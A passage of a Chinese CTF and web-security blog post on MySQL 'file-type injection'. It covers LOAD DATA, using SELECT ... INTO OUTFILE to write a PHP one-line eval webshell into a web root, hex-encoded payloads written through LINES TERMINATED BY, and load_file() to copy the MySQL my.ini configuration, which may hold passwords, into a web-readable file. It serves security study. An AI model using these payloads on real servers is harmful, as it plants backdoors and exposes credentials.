+</div><p>将 /tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp 等文件夹。</p>
+<p>3.<strong>SELECT&hellip;..INTO OUTFILE &lsquo;file_name&rsquo;</strong>：把被选择的行写入一个文件中【向文件中导入】
+形式：
+（1）直接将 select 内容导入到文件中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select version() into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者换成一句话木马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select &lt;?php @eval($_post[&#34;mima&#34;])?&gt; into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（2）修改文件结尾</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select version() Into outfile &#34;c:\\phpnow\\htdocs\\test.php&#34; LINES TERMINATED BY 0x16 进制文件</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通常是用 ‘\r\n’ 结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDSTERMINATED BY
+其中，16 进制可以为一句话或者其他任何的代码，可自行构造</p>
+<p>注：
+根据环境，在文件路径当中要注意转义
+当前台无法导出数据的时候，我们可以利用下面的语句</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="n">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;c:</span><span class="se">\\</span><span class="s1">wamp</span><span class="se">\\</span><span class="s1">bin</span><span class="se">\\</span><span class="s1">mysql</span><span class="se">\\</span><span class="s1">mysql5.6.17</span><span class="se">\\</span><span class="s1">my.ini&#39;</span><span class="p">)</span><span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;c:</span><span class="se">\\</span><span class="s1">wamp</span><span class="se">\\</span><span class="s1">www</span><span class="se">\\</span><span class="s1">test.php&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。上述 my.ini 当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来</p>
+<p>4.<strong>@@basedir</strong>：显示mysql的安装目录
+5.<strong>@@datadir</strong>：显示mysql的数据目录
+6.<strong>substr(字符串,字符串的起始值,截取的长度)</strong>：截取字符串
+7.<strong>hex()</strong>：16进制转换</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2023-07-01 11:25:40">Updated on 2023-07-01&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/" data-title="文件型注入" data-hashtags="Web,CTF"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2023web-%E6%96%87%E4%BB%B6%E5%9E%8B%E6%B3%A8%E5%85%A5/" data-title="文件型注入"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - Web">Web</a><a href="/tags/ctf/" class="post-tag" title="Tags - CTF">CTF</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2023web-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="日志包含漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>日志包含漏洞</a><a href="/posts/2023web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/" class="post-nav-item" rel="next" title="文件上传绕过">文件上传绕过<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.136.5">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.13">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="Tin10g.github.io">Ting</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.13"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
